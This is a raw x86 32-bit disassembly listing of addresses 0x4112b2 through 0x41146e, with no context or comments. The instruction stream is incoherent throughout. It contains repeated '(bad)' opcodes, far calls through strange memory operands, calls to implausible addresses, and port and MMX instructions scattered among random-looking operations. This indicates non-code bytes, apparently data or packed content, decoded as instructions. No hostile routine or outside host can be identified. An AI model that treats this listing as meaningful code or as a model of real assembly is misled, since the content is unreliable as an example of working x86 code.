  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
